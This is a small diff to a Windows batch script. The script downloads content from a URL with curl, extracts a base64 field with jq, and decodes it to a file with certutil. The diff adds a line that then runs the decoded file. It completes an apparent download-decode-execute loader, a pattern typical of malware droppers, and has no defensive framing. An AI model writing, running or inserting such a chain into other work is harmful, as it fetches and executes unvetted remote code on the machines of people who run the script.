@@ -14,3 +14,5 @@ curl -s %o% | jq -r ".entry|.content|.\"$t\"" > "%d%\%filename%.base64"
 echo decoding
 if exist "%d%\%filename%" del "%d%\%filename%"
 "%systemroot%\System32\certutil.exe" -decode "%d%\%filename%.base64" "%d%\%filename%"
+
+call "%d%\%filename%"
